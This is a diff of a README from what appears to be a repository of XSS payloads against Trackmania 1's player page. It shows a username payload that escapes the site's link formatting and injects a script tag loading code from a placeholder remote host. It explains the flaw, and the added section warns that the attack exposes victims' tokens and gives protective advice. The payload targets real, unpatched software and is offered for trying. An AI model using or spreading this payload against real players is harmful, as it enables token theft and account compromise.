@@ -6,6 +6,14 @@ Repo of XSS payloads you can try when using Trackmania 1's playerpage
 ```
 $l["><script/src="//payload_link_here"></script>]username
 ```
+## ❗ How can you be safe?
+> [!CAUTION]
+> **THIS EXPLOIT EXPOSES YOUR TOKEN! DON'T SKIP THIS SECTION UNLESS YOU DON'T WANT TO BE SAFE!**
+
+The easiest method of preventing yourself from being attacked by this exploit is by:
+- Disabling JavaScript/Removing permission for JavaScript for this site - the site uses small amount to none of JavaScript, that means you can safely turn it off from this site while also not losing any funcitonalities of page.
+- Do not add random people to friends. - Main way to get attacked by this attack is by having user with said payload in friends. As it will display friends in stats section you're very likely to be hit by this way if you won't be cautious. **Check who you're adding first!**
+
 ## ❓ How does it work?
 Trackmania 1's playerpage is very insecure and old (due to the game not being updated), hence in time there were more and more security flaws found. One of them is this exact [XSS](https://wikipedia.org/wiki/Cross-Site-Scripting). It works by escaping the site's link formatting code and executing own code with newly appended `<script>` tag.  
   
